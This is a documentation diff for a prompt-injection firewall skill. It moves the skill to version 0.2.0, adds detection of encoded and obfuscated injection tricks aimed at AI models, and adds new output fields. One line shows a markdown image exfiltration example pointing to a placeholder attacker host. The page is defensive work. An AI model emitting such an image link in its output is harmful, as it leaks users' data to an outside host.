@@ -4,7 +4,7 @@
 **Skill ID:** `security/prompt_injection_firewall`
 **Issuer:** [@mrmasa88](https://github.com/mrmasa88) ([@ARPAHLS](https://github.com/ARPAHLS), [AO](https://github.com/0x-AO-Protocol)) · **Contact:** masa88keith@gmail.com
 <!-- skill-doc-meta:begin -->
-**Version**: `0.1.0` — 31 Jul 2026
+**Version**: `0.2.0` — 17 Sep 2026
 <!-- skill-doc-meta:end -->
 **Recommended install:** `pip install "skillware[security_prompt_injection_firewall]"`. See [Install extras](../usage/install_extras.md).
 
@@ -20,10 +20,13 @@ Often composed in host chains — for example **`sanitize_input`**. See [Skill c
 
 1. Hidden HTML/CSS channels, HTML comments, markdown comments, and metadata attributes
 2. Zero-width, bidi, Unicode tag-block, and variation-selector (emoji smuggling) channels
-3. Confusable/homoglyph skeletons against the local instruction lexicon
-4. Nested base64 / hex / URL-encoding payloads (decode depth ≤ 3)
-5. Instruction-override lexicon families (negation, role reset, exfiltration, hijack, authority, boundary spoof)
-6. Corroboration and mention-vs-use downgrades controlled by `sensitivity`
+3. Confusable/homoglyph skeletons and mixed-script lookalikes against the local instruction lexicon
+4. Leetspeak deobfuscation and typoglycemia (scrambled character order) detection on high-signal override terms
+5. Nested base64 / hex / URL-encoding payloads, multi-token ROT13, and reversed-token sequences (decode depth ≤ 3)
+6. Markdown and HTML image exfiltration channels (`![alt](https://attacker.com/leak?q=...)`)
+7. Instruction-override lexicon families (negation, role reset, exfiltration, hijack, authority, boundary spoof)
+8. Corroboration and mention-vs-use downgrades controlled by `sensitivity`
+9. DoS resource caps (100k char input, decode depth & candidate count caps) failing closed safely
 
 ## Bundle layout
 
@@ -39,9 +42,12 @@ The skill lives in `skills/security/prompt_injection_firewall/`. [Skill anatomy]
 **Outputs Schema:**
 * `is_safe` (boolean): `false` when the corroboration rule marks the text unsafe.
 * `risk_level` (string): Aggregated risk (`none`, `low`, `medium`, `high`, `critical`).
+* `policy_action` (string): Prescriptive operator action (`allow`, `flag`, `block`).
 * `detected_threat` (string): Primary human-readable threat summary when unsafe.
-* `findings` (array): Structured findings with `category`, `channel`, `severity`, `span`, `evidence`, and optional `pattern_id`.
+* `findings` (array): Structured findings with `category`, `channel`, `severity`, `span`, `evidence`, optional `pattern_id`, `decode_chain`, and `decoded_preview`.
 * `sanitized_text` (string): Text with flagged spans removed when unsafe content was sanitizable.
+* `removed_span_count` (integer): Number of sanitized hostile or hidden spans stripped from source text.
+* `sanitized_length_delta` (integer): Length difference in characters between original text and sanitized text.
 * `offline` (boolean): Always `true`.
 * `sensitivity` (string): Sensitivity level used for the scan.
 
@@ -268,6 +274,7 @@ Commits that touched this skill bundle or its catalog page ([`security/prompt_in
 
 | Commit | Description | Date | Version | Contributors |
 | :--- | :--- | :--- | :--- | :--- |
+| _#273_ | feat(security): prompt_injection_firewall v0.2.0 — evasion detection, Layer-1 hygiene, and operator policy actions (#273) | 17 Sep 2026 | `0.2.0` | [@tusharjamunkar](https://github.com/tusharjamunkar) |
 | [`790787d`](https://github.com/ARPAHLS/skillware/commit/790787d0e72262ddfeb26f747f880012ca2b1ca6) | docs: five-provider Usage Examples guard and catalog loop backfill (#347) | 10 Sep 2026 | `0.1.0` | [@rosspeili](https://github.com/rosspeili) |
 | [`12fbd1a`](https://github.com/ARPAHLS/skillware/commit/12fbd1a11bdf66250008afc59df7048935eafc73) | docs: adopt Skill anatomy vocabulary on catalog page (#319) | 1 Sep 2026 | `0.1.0` | [@rosspeili](https://github.com/rosspeili) |
 | [`4096824`](https://github.com/ARPAHLS/skillware/commit/4096824fbaeb87a2b48a90d1ba2bec29cf3a1766) | docs: document issuer.org policy and align ARPA-driven registry skills (#295) (#316) | 28 Aug 2026 | `0.1.0` | [@rosspeili](https://github.com/rosspeili) |
